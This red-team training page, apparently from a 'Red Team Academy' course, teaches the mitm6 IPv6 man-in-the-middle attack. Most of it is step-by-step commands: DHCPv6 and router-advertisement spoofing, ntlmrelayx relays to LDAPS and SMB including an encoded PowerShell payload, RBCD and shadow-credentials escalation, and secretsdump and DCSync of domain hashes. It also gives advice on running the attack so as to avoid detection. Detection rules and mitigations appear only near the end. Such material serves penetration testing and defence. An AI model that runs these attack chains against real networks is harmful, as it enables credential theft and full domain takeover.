---
layout: training-page
title: "mitm6 — IPv6 MITM — Red Team Academy"
module: "Network Attacks"
tags:
  - mitm6
  - ipv6
  - dhcpv6
  - network
  - ntlm-relay
  - windows
page_key: "network-mitm6"
render_with_liquid: false
---

# mitm6 — IPv6 MITM

mitm6 exploits a fundamental Windows behavior: Windows prefers IPv6 over IPv4 by default on dual-stack networks. By spoofing DHCPv6 and acting as a rogue IPv6 router, mitm6 becomes the DNS server for Windows hosts on the segment — redirecting authentication attempts and enabling NTLM relay without needing to poison LLMNR or intercept ARP at all.

## Why It Works

```
1. Windows periodically sends DHCPv6 SOLICIT broadcasts (even if no IPv6 infra exists)
2. mitm6 responds with a DHCPv6 ADVERTISE and REPLY, assigning:
   - A link-local IPv6 address
   - Itself as the IPv6 DNS server
3. Windows now uses mitm6 for DNS resolution (IPv6 preferred over IPv4)
4. mitm6 intercepts DNS queries and responds with its own IPv6 address
5. Windows clients authenticate to mitm6 using NTLM
6. mitm6 relays the credentials with ntlmrelayx
```

## Prerequisites

```bash
# Check: are Windows hosts sending DHCPv6 SOLICITs?
tcpdump -i eth0 'ip6 and udp port 546'
# If you see traffic → mitm6 will work

# Check: is SMB signing disabled on targets? (for relay)
crackmapexec smb 192.168.1.0/24 --gen-relay-list no_signing.txt
nmap --script smb2-security-mode -p 445 192.168.1.0/24

# Check: is LDAP signing enforced?
ldap-signing check or check DC policy
# Not always required if targeting LDAPS or HTTP endpoints
```

## Running mitm6

```bash
# Install
pip3 install mitm6

# Basic — spoof DHCPv6 for all hosts on segment
mitm6 -i eth0 -d contoso.local

# Limit to specific hosts (reduces noise)
mitm6 -i eth0 -d contoso.local --mac AA:BB:CC:DD:EE:FF

# Ignore specific hosts (avoid disrupting critical systems)
mitm6 -i eth0 -d contoso.local --ignore-nofqdn

# Verbose
mitm6 -i eth0 -d contoso.local -v
```

## Combined Attack: mitm6 + ntlmrelayx

```bash
# Terminal 1: Run mitm6
mitm6 -i eth0 -d contoso.local

# Terminal 2: Run ntlmrelayx — relay captured auth to LDAP on DC
# This creates a new computer account and can dump LDAP data
ntlmrelayx.py -6 -t ldaps://192.168.1.10 -wh fakewpad.contoso.local \
  -l /tmp/loot --delegate-access

# Terminal 2 (alternative): relay to SMB for command execution
ntlmrelayx.py -6 -t smb://192.168.1.20 -wh fakewpad.contoso.local \
  -smb2support -c "powershell -enc BASE64PAYLOAD"

# Terminal 2 (alternative): relay to multiple targets
ntlmrelayx.py -6 -tf no_signing.txt -wh fakewpad.contoso.local \
  -smb2support --sam

# -6          = listen on IPv6
# -wh         = WPAD hostname to respond to (mitm6 will resolve this to itself)
# -l          = dump LDAP output to directory
# --delegate-access = create machine account with delegation rights
```

## WPAD + NTLM Relay Flow

```
Victim opens browser
  │
  ▼
Browser queries: http://fakewpad.contoso.local/wpad.dat
  │
  ▼
mitm6 resolved fakewpad.contoso.local → attacker IPv6
  │
  ▼
ntlmrelayx serves the WPAD response — forces NTLM auth
  │
  ▼
Victim sends Net-NTLMv2 to ntlmrelayx
  │
  ▼
ntlmrelayx relays to DC LDAP / SMB target
  │
  ▼
If admin: SAM dump, new computer account, command execution
```

## LDAP Relay — Creating a Computer Account

```bash
# When a domain user's credentials are relayed to LDAP:
# ntlmrelayx creates a computer account (MachineAccount$) with a known password
# and sets Resource-Based Constrained Delegation (RBCD)
# This allows impersonating any user to the victim machine via S4U2Self

# After ntlmrelayx creates the account:
# 1. Get TGT for the new machine account
impacket-getTGT contoso.local/NEWMACHINE\$ -hashes :NThash

# 2. Impersonate Administrator via S4U2Proxy
impacket-getST -spn cifs/VICTIMPC.contoso.local \
  -impersonate Administrator \
  contoso.local/NEWMACHINE\$ -hashes :NThash

# 3. Use the service ticket
export KRB5CCNAME=Administrator.ccache
impacket-smbclient -k -no-pass VICTIMPC.contoso.local
```

## IPv6 Rogue Router Advertisement

```bash
# Alternative to DHCPv6: send Router Advertisements to set default IPv6 gateway
# Works even without DHCPv6 — targets SLAAC (Stateless Address Autoconfiguration)

# Using scapy:
python3 -c "
from scapy.all import *
ra = IPv6(dst='ff02::1')/ICMPv6ND_RA()/ICMPv6NDOptPrefixInfo(prefix='2001:db8::/64')
sendp(Ether(dst='33:33:00:00:00:01')/ra, iface='eth0', loop=1, inter=5)
"

# Using radvd or fake_router6 (thc-ipv6 toolkit)
fake_router6 eth0 2001:db8::/64
```

## Operational Notes

```
# mitm6 is disruptive — it intercepts DHCPv6 for the entire subnet
# Run for limited time windows (30-60 minutes) to avoid detection
# The -d flag limits impact to a single domain

# Stop cleanly — Windows will recover IPv4 DNS after mitm6 stops
# Kill mitm6 → Windows DHCPv6 lease expires → IPv4 DNS resumes

# Best results:
# - Run during business hours when users are active (browser traffic = WPAD)
# - Target DCs and SQL servers in ntlmrelayx -t (high value, often no signing)
# - Combine with Bloodhound to identify delegation paths after getting computer acct
```

## Full Attack Walkthrough: mitm6 + ntlmrelayx LDAP Relay

```bash
# Environment: Windows Active Directory domain "contoso.local"
# DC IP: 192.168.1.10
# Attacker IP: 192.168.1.99

# Step 1: Verify DHCPv6 traffic is present
tcpdump -i eth0 'ip6 and udp port 546' -c 10
# Look for: ff02::1:2 destination (DHCPv6 multicast)

# Step 2: Check if LDAPS is available on DC (port 636)
nmap -p 636 192.168.1.10
openssl s_client -connect 192.168.1.10:636 -showcerts 2>/dev/null | head -20

# Step 3: Start mitm6
mitm6 -i eth0 -d contoso.local -v
# Output: DHCPv6 replies being sent to Windows hosts
# Output: DNS queries being intercepted

# Step 4: Start ntlmrelayx targeting LDAPS on DC
ntlmrelayx.py \
  -6 \
  -t ldaps://192.168.1.10 \
  -wh fakewpad.contoso.local \
  -l /tmp/ldap_dump \
  --delegate-access \
  --no-smb-server \
  --no-http-server
# -6 = bind on IPv6 (required for mitm6 relay)
# --delegate-access = auto-configure RBCD after creating computer account
# -l = dump LDAP info to directory

# Step 5: Wait for Windows host to authenticate
# When a user opens a browser → WPAD auth → ntlmrelayx relays to LDAPS DC
# Output: "LDAP relay attack successful!"
# Output: "Adding msDS-AllowedToActOnBehalfOfOtherIdentity for VICTIM$"

# Step 6: Inspect dumped LDAP data
ls /tmp/ldap_dump/
# domain_computers.grep, domain_users.grep, domain_policy.json

# Step 7: Use the created computer account
impacket-getTGT contoso.local/ATTACKERPC\$ -hashes :NThashFromOutput
export KRB5CCNAME=ATTACKERPC\$.ccache

# Step 8: Impersonate Domain Admin via S4U2Self
impacket-getST \
  -spn cifs/VICTIMPC.contoso.local \
  -impersonate Administrator \
  contoso.local/ATTACKERPC\$ -hashes :NThash
export KRB5CCNAME=Administrator.ccache

# Step 9: Access victim machine as Administrator
impacket-secretsdump -k -no-pass VICTIMPC.contoso.local
```

## Shadow Credentials Attack via mitm6

Shadow credentials abuse the `msDS-KeyCredentialLink` attribute — add a certificate credential for a target account, then authenticate as that account using the certificate.

```bash
# Requires:
# - LDAPS relay to DC (not regular LDAP — writes require LDAPS)
# - pywhisker + PKINITtools installed
# github.com/ShutdownRepo/pywhisker
# github.com/dirkjanm/PKINITtools

# Start mitm6 + ntlmrelayx with shadow-credentials flag
mitm6 -i eth0 -d contoso.local &

ntlmrelayx.py \
  -6 \
  -t ldaps://192.168.1.10 \
  -wh fakewpad.contoso.local \
  --shadow-credentials \
  --shadow-target "DC01$"
# --shadow-target = the account to add KeyCredential to
# When a machine account relays, we write to its own KeyCredential

# ntlmrelayx output (success):
# [*] Generating certificate for shadow credentials attack
# [*] Adding KeyCredential: <DeviceID>
# [*] Certificate saved to: <DeviceID>.pfx
# [*] PFX password: <password>

# Authenticate using the certificate to get TGT
python3 gettgtpkinit.py \
  -cert-pfx <DeviceID>.pfx \
  -pfx-pass <password> \
  contoso.local/DC01\$ DC01.ccache

export KRB5CCNAME=DC01.ccache

# Extract NT hash from TGT (machine account hash)
python3 getnthash.py contoso.local/DC01\$ -key <as-rep-key>

# With machine account hash → DCSync / secretsdump → all domain hashes
impacket-secretsdump -hashes :<NT hash> contoso.local/DC01\$@192.168.1.10
```

## Relay to LDAPS for RBCD

Resource-Based Constrained Delegation (RBCD) lets the attacker-controlled computer account impersonate any user to the target machine.

```bash
# ntlmrelayx automatically sets RBCD when --delegate-access is used
# After successful relay:

# View the created machine account details from ntlmrelayx output:
# Account name: RANDOMNAME$
# Password: <random>
# msDS-AllowedToActOnBehalfOfOtherIdentity set on VICTIMPC$ for RANDOMNAME$

# Get TGT for attacker machine account
impacket-getTGT contoso.local/RANDOMNAME\$ -dc-ip 192.168.1.10 \
  -hashes :NThashFromNtlmrelayx

export KRB5CCNAME=RANDOMNAME.ccache

# S4U2Self — get service ticket impersonating Administrator
impacket-getST \
  -spn cifs/VICTIMPC.contoso.local \
  -impersonate Administrator \
  contoso.local/RANDOMNAME\$ \
  -k -no-pass \
  -dc-ip 192.168.1.10

# Use ticket for PSExec/secretsdump
export KRB5CCNAME=Administrator@cifs_VICTIMPC.contoso.local@CONTOSO.LOCAL.ccache
impacket-psexec -k -no-pass VICTIMPC.contoso.local
```

## Scope Control

```bash
# Limit mitm6 blast radius — important on large segments

# Limit to specific interface only
mitm6 -i eth0 -d contoso.local

# Limit to specific domain (ignores queries from other domains)
mitm6 -i eth0 -d contoso.local -d child.contoso.local

# Ignore hosts without FQDN in DHCPv6 request (reduces noise)
mitm6 -i eth0 -d contoso.local --ignore-nofqdn

# Target only specific MAC addresses
mitm6 -i eth0 -d contoso.local --mac AA:BB:CC:DD:EE:FF

# Rate limit DHCPv6 replies to avoid disruption
mitm6 -i eth0 -d contoso.local --no-ra
# --no-ra = don't send Router Advertisements (DHCPv6 only)

# Time-limited run (30 minutes during business hours)
timeout 1800 mitm6 -i eth0 -d contoso.local
```

## Detection: DHCPv6 Spoofing Signatures

```
Network-level indicators:
  - Unexpected DHCPv6 ADVERTISE or REPLY from a non-router host
    Source: link-local fe80::/10 address of attacker, not router
  - Rogue IPv6 DNS server assigned via DHCPv6 to Windows clients
    Windows hosts suddenly resolve names to IPv6 addresses
  - DNS queries going to unexpected IPv6 address (attacker's link-local)
  - WPAD HTTP requests to IPv6 addresses (http://[fe80::...]/wpad.dat)

IDS/IPS signatures:
  - Suricata rule: alert dhcp6 any any -> any any
      (msg:"DHCPv6 from unexpected source"; content:"|00 02|"; # ADVERTISE
       detection_filter:track by_src, count 5, seconds 60)
  - Alert on DHCPv6 replies from addresses not in the approved DHCP server list

SIEM correlation:
  - Windows Event 4624 with IPv6 source addresses for workstation logons
  - DNS resolution returning IPv6 addresses for normally-IPv4 internal names
  - Multiple authentication failures to DC LDAP from new source IPs
```

## Defensive Mitigations

```
Disable DHCPv6 (if IPv6 not required):
  Group Policy: Computer Configuration → Windows Settings → Security Settings
    → Windows Firewall → Inbound Rules
    Block DHCPv6: UDP port 546 inbound (from any)
    Block DHCPv6: UDP port 547 inbound (from any)

Block Router Advertisements:
  Cisco switch: ipv6 nd ra suppress all (on access ports)
  Windows Firewall: Block ICMPv6 Type 134 inbound

Network-level controls:
  - RA Guard on managed switches (blocks Router Advertisement frames)
  - DHCPv6 Guard (allows only known DHCPv6 servers to reply)
  - IPv6 First Hop Security (FHS) on Cisco: ipv6 dhcp guard policy CLIENT
    device-role client

If IPv6 is not in use but cannot be disabled:
  - Deploy a legitimate DHCPv6 server to "win" the race condition
  - Use 802.1X on all access ports (makes spoofing harder)

LDAP signing and channel binding (blocks LDAP relay):
  DC: Set "LDAP server signing requirements" = Require signature (GPO)
  DC: Enable LDAP channel binding (registry + patch)
```

## Resources

- mitm6 — `github.com/dirkjanm/mitm6`
- mitm6 blog post (dirkjanm) — `dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/`
- Impacket ntlmrelayx — `github.com/fortra/impacket`
- pywhisker (shadow credentials) — `github.com/ShutdownRepo/pywhisker`
- PKINITtools — `github.com/dirkjanm/PKINITtools`
- MITRE T1557 — Adversary-in-the-Middle — `attack.mitre.org/techniques/T1557/`
